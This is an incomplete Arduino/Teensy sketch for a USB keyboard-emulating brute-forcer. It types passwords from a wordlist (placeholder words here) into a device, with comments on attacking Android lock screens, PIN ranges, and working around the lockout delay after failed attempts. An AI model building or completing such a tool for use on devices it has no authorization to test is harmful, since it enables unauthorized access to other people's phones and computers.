/* Do not use this file !!! Code is not complete */

// First remove *leonardo.ino if you're using a Teensy 3/3++ or remove *teensy3.ino if you're using an Arduino Leonardo

//If you're not using LCD screen, remove lcd*.ino
//If you're using a classic LCD screen keep ????.ino and specify pin below
//lcdPins = 0;

//If you're using a LCD16x2 import LCD16x2.h from https://www.olimex.com/Products/Duino/Shields/SHIELD-LCD16x2/
//And keep lcd162-leonardo.ino


/*
//If you're not using LCD screen, remove the line below
//If you're using LCD screen remove the line depending of which LCD you're using

//Standard LCD
#include <LiquidCrystal.h>

//Need LCD16x2.h from https://www.olimex.com/Products/Duino/Shields/SHIELD-LCD16x2/

*/

//SDLeonardo

//If you're not using SD card specify it below and remove *SD*.ino, you can also remove SdPins var.
boolean UsingSdCard = true;

//If you're using a SD card reader specify pin below
//Ethernet Shield on Uno and SD Shield for Leonardo/Uno use 4
const int sdCsPin = 4;

//If you're bruteforcing a PIN you can remove the lines below and specify it at the end
//If you don't have a login you can remove the specified line

  //SD Card : you specify one or more file location for login and password
  #include <LineByLineReadFiles.h>  
/*  char *loginWordfiles[] = {"file1.txt", "file2.txt"};
  LineByLineReadFiles login(loginWordfiles, sdCsPin);
  char *passwordWordfiles[] = {"file1.txt", "file2.txt"};
  LineByLineReadFiles password(passwordWordfiles, sdCsPin);  
*/

// remove before commit
  //NO SD Card : you specify one or more login and password
  #include <LineByLine.h>   
  char *loginWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet"};
  LineByLine login(loginWordlist);
  char *passwordWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet", "test"};
  


//If you're not bruteforcing a PIN you can remove the lines below
boolean bruteForcingPin = false;
int bruteForceMinLength = 4;
int bruteFroceMaxLength = 16;

//If there is a limitation (Android: 30s to wait every 5 failed attempts)
int limitTest = 0;
int timeToWait = 5000;

void setup(){
  int attempt = 0;
  lcdStart();
  keyboardStart();

  pinMode(7, OUTPUT);
  digitalWrite(7, HIGH);
  pinMode(8, INPUT);
  
  delay(5000);
}

void loop(){

  while(!digitalRead(8)) {}

  
LineByLine password(passwordWordlist);
  while(password.hasNext()) {
     //testedLogin = login.next()
     char* testedPassword = password.next();
     lcdClear();
     delay(50);
     lcdPrint(testedPassword);
  
     //here you put the action for example, attacking Android password
     typePassword(testedPassword);
     typeSpecial(KEY_RETURN);
     delay(150);

/*    if (password.hasNext()) {
      typePassword("true");
     typeSpecial(KEY_RETURN);
    }
    else {
      typePassword("false");
     typeSpecial(KEY_RETURN);
    }
*/
     
/*        attempt ++;

        if (attempt == 5)
        {
          //Type enter to close warning box
          delay(200);
          enterKey();
          
          //Type enter every 5 second to keep android alive
          for (keepalive = 0 ; keepalive < 30 ; keepalive++)
          {
            delay(1000);
            enterKey();  
          }
     
          //wait more
          delay(100);
          enterKey();
          attempt = 0;
        }
*/      
   }
   lcdClear();
   while(1) {}
}
